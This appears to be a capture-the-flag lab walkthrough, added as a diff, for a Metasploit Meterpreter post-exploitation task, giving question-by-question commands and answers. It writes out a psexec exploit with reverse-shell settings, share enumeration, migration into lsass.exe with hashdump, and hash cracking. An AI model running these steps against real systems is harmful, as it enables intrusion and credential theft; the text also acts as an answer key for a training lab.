@@ -1,0 +1,44 @@
+Metasploit: Meterpreter {Task 5 Post-Exploitation Challenge}
+
+Question 1: What is the computer name?
+{{Type the following:
+msfconsole
+use exploit/windows/smb/psexec
+set LHOST [your tun0 IP]
+Set RHOSTS [victim IP]
+Set SMBUser ballen
+Set SMBPass Password1
+run
+
+Once the meterpreter shell opens up, use the command "sysinfo" to find this computer's name}}
+
+Question 2: What is the target domain?
+{{The answer is also revealed with sysinfo}}
+
+Question 3: What is the share likely created by the user?
+{{Type:
+background
+use post/windows/gather/enum_shares
+set SESSION [sessionid] (find this by typing sessions -i)
+run}}
+
+Question 4: What is the NTLM hash of the jchambers user?
+{{Type:
+migrate [PID of lsass.exe]
+hashdump
+the NTLM hash will be between the third and fourth colon}}
+
+Question 5: What is the cleartext password of the jchambers user?
+{{Hint: Use crackstation}}
+
+Question 6: Where is the "secrets.txt" file located?
+{{Type: search -f secrets.txt, the search may take a few minutes}}
+
+Question 7: What is the Twitter password revealed in the "secrets.txt" file?
+{{Hint: cat secrets.txt in the appropriate directory}}
+
+Question 8: Where is the "realsecret.txt" file located?
+{{Type: search -f realsecret.txt}}
+
+Question 9: What is the real secret?
+{{Hint: cat "c:\path to file\realsecret.txt"}}
